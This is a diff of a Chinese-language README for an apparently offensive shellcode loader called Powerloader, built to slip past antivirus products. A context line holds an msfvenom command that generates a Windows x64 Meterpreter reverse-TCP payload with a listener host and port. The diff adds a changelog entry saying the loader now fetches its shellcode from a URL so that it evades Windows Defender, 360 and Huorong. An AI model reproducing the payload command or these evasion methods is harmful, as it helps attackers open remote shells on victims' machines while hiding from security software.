@@ -80,15 +80,15 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 必须保证你的shellcode是干净的，否则还是会被Windows Defender抓住
 
-
-
-![](Image\demo.gif)
+![示例GIF](https://github.com/INotGreen/GlllPowerloader/blob/main/Image/demo.gif)
 
 # 4.更新
 
 [+] 2022年12.21，Powerloader发布
 
-[+]2023 年11.15-19， 删除冗余的功能，优化代码（之前的版本涉及语言安装环境太多了，使用太麻烦，为了简便就留C/C++的加载器）
+[+]2023 年11.15， 删除冗余的功能，优化代码，（之前的版本涉及语言安装环境太多了，使用太麻烦，为了简便就留C/C++的加载器）
+
+[+]2023年11.20，加载方式由本地加载改成URL分离加载，可以免杀defender，360，火绒（前提是shellcode内存是没有被标记的）
 
 免杀加载器正在更新中。。。
 
